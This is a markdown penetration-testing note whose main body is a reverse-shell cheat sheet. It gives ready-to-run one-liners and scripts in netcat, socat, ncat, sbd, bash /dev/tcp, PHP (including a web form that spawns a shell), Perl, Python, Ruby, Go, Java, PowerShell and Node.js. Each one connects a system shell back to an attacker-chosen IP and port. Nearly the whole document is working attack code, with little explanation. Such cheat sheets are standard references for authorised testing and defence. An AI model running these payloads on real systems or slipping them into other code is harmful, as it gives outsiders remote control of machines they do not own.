# Shells


## How to Build one

- https://app.codecrafters.io/courses/shell/


## Reverse shell cheat sheet

> Penetration Testing Related

Note: change IP and PORT to your values.

### Tooling

#### `nc`

```shell
nc -nlvp PORT          # Listen
nc -e /bin/sh IP PORT  # Connect
nc -c sh IP PORT
# OpenBSD Netcat version (without -e option)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f
```

#### `socat`


```shell
socat tcp-listen:PORT -           # Listen
socat exec:/bin/sh tcp:IP:PORT    # Connect
socat file:`tty`,raw,echo=0 tcp-listen:PORT # listen pty
socat exec:/bin/sh,pty,stderr,setsid,sigint,sane tcp:IP:PORT #  connect:

```

#### `ncat`

```shell
ncat --allow IP -vnl PORT --ssl    # Listen
ncat --exec /bin/sh --ssl IP PORT  # Connect
```

#### `sbd`

```shell
sbd -lp PORT
sbd -e /bin/sh HOST PORT
sbd -l -c on -k ENCRYPTION_PHRASE -p PORT
sbd -k ENCRYPTION_PHRASE -e /bin/sh HOST PORT
```

#### `Bash`

```shell
# TCP
bash -i >& /dev/tcp/IP/PORT 0>&1
bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'
# UDP
nc -u -lvp PORT
sh -i >& /dev/udp/IP/PORT 0>&1 # Connect
```
#### `PHP`

```shell
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

```php
<?php
if (empty($_POST['i']) && empty($_POST['p'])) {
  echo "IP address and port not specified!";
}
else
{
  $ip = $_POST["i"];
  $port = $_POST["p"];
  $shell = 'uname -a; w; id; /bin/sh -i';
  $chunk_size = 1400;
  $write_a = null;
  $error_a = null;
  $process = null;
  $pipes = null;
  $errno = "";
  $errstr = "";

  $sock = fsockopen($ip, $port, $errno, $errstr, 30);
  if (!$sock) {
    echo "$errstr ($errno)";
    exit(1);
  }

  $descriptorspec = array(
      0 => array("pipe", "r"),
      1 => array("pipe", "w"),
      2 => array("pipe", "w")
      );

  $process = proc_open($shell, $descriptorspec, $pipes);
  if (!is_resource($process)) {
    echo "ERROR: Can't spawn shell";
    exit(1);
  }

  stream_set_blocking($pipes[0], 0);
  stream_set_blocking($pipes[1], 0);
  stream_set_blocking($pipes[2], 0);
  stream_set_blocking($sock, 0);

  while(!feof($sock) && !feof($pipes[1])) {
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

    if (in_array($sock, $read_a)) {
      $input = fread($sock, $chunk_size);
      fwrite($pipes[0], $input);
    }

    if (in_array($pipes[1], $read_a)) {
      $input = fread($pipes[1], $chunk_size);
      fwrite($sock, $input);
    }

    if (in_array($pipes[2], $read_a)) {
      $input = fread($pipes[2], $chunk_size);
      fwrite($sock, $input);
    }
  }

  fclose($sock);
  fclose($pipes[0]);
  fclose($pipes[1]);
  fclose($pipes[2]);
  proc_close($process);

}
?>
<html>
<body>
<form method="post">
<input type="text" name="i" />
<input type="text" name="p" />
<input type="submit" />
</form>
</body>
</html>
```


#### `Perl`

```shell
perl -e 'use Socket;$i="IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

#### `Python`

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
```python
#!/usr/bin/env python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("IP", PORT))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

#### `Ruby`

```shell
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

#### `Go`

```go
package main;
import"os/exec";
import"net";
func main() {
  c, _ := net.Dial("tcp","IP:PORT");
  cmd := exec.Command("/bin/sh");
  cmd.Stdin=c;
  cmd.Stdout = c;
  cmd.Stderr = c;
  cmd.Run()
}
```
```shell
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","IP:PORT");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/rev.go && go run /tmp/rev.go && rm /tmp/rev.go
```
#### `Java`

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

#### `Powershell`

```ps1
$address = 'IP'
$port = 'PORT'
function cleanup {
if ($client.Connected -eq $true) {$client.Close()}
if ($process.ExitCode -ne $null) {$process.Close()}
exit}
$client = New-Object system.net.sockets.tcpclient
$client.connect($address,$port)
$stream = $client.GetStream()
$networkbuffer = New-Object System.Byte[] $client.ReceiveBufferSize
$process = New-Object System.Diagnostics.Process
$process.StartInfo.FileName = 'C:\\windows\\system32\\cmd.exe'
$process.StartInfo.RedirectStandardInput = 1
$process.StartInfo.RedirectStandardOutput = 1
$process.StartInfo.RedirectStandardError = 1
$process.StartInfo.UseShellExecute = 0
$process.Start()
$inputstream = $process.StandardInput
$outputstream = $process.StandardOutput
Start-Sleep 1
$encoding = new-object System.Text.AsciiEncoding
while($outputstream.Peek() -ne -1){$out += $encoding.GetString($outputstream.Read())}
$stream.Write($encoding.GetBytes($out),0,$out.Length)
$out = $null; $done = $false; $testing = 0;
while (-not $done) {
if ($client.Connected -ne $true) {cleanup}
$pos = 0; $i = 1
while (($i -gt 0) -and ($pos -lt $networkbuffer.Length)) {
$read = $stream.Read($networkbuffer,$pos,$networkbuffer.Length - $pos)
$pos+=$read; if ($pos -and ($networkbuffer[0..$($pos-1)] -contains 10)) {break}}
if ($pos -gt 0) {
$string = $encoding.GetString($networkbuffer,0,$pos)
$inputstream.write($string)
start-sleep 1
if ($process.ExitCode -ne $null) {cleanup}
else {
$out = $encoding.GetString($outputstream.Read())
while($outputstream.Peek() -ne -1){
$out += $encoding.GetString($outputstream.Read()); if ($out -eq $string) {$out = ''}}
$stream.Write($encoding.GetBytes($out),0,$out.length)
$out = $null
$string = $null}} else {cleanup}}

```
```ps1
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('IP', PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
#### `nodejs`

```js
// rev.js
var net = require("net"), sh = require("child_process").exec("/bin/bash");
var client = new net.Socket();
client.connect(PORT, "IP", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);
sh.stderr.pipe(client);});
```
```js
require("child_process").exec('bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"')
```
```js
var x = global.process.mainModule.require
x('child_process').exec('nc IP PORT -e /bin/bash')
```
```shell
node rev.js
```
```shell
node -e "require('child_process').exec('bash -c \"bash -i >& /dev/tcp/IP/PORT 0>&1\"')"
```

### Further Reading
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
- https://highon.coffee/blog/reverse-shell-cheat-sheet/#python-reverse-shell
- https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
